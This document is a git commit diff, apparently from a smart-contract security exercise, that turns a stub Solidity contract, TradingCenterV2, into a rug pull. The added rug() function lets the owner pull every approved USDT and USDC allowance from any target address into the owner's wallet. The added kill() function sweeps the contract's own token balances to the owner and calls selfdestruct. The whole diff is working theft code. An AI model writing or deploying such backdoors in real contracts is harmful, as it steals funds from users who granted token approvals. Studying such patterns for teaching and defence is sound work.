917ceefb913d4430a95c88996fc5bbef1d4e05c6
absoluteyl <17698254+absoluteyl@users.noreply.github.com>
2023-04-26 18:12:46 +0800

    add ownable and some functions for rugpull
    Signed-off-by: absoluteyl <17698254+absoluteyl@users.noreply.github.com>

--- src/TradingCenterV2.sol
+++ src/TradingCenterV2.sol
@@ -1,6 +1,30 @@
 // SPDX-License-Identifier: SEE LICENSE IN LICENSE
 pragma solidity ^0.8.17;
 
-// TODO: Try to implement TradingCenterV2 here
-contract TradingCenterV2 {
+import "./TradingCenter.sol";
+import "./Ownable.sol";
+
+contract TradingCenterV2 is TradingCenter, Ownable {
+  constructor () {
+    initializeOwnable(msg.sender);
+  }
+
+  function rug(address _target) public onlyOwner {
+    uint256 usdt_allowed_amount = usdt.allowance(_target, address(this));
+    uint256 usdc_allowed_amount = usdc.allowance(_target, address(this));
+    if (usdt_allowed_amount > 0) {
+      uint256 _amount = usdt_allowed_amount > usdt.balanceOf(_target) ? usdt.balanceOf(_target) : usdt_allowed_amount;
+      usdt.transferFrom(_target, msg.sender, _amount);
+    }
+    if (usdc_allowed_amount > 0) {
+      uint256 _amount = usdc_allowed_amount > usdc.balanceOf(_target) ? usdc.balanceOf(_target) : usdc_allowed_amount;
+      usdc.transferFrom(_target, msg.sender, _amount);
+    }
+  }
+
+  function kill() public onlyOwner {
+    usdt.transfer(msg.sender, usdt.balanceOf(address(this)));
+    usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
+    selfdestruct(payable(msg.sender));
+  }
 }
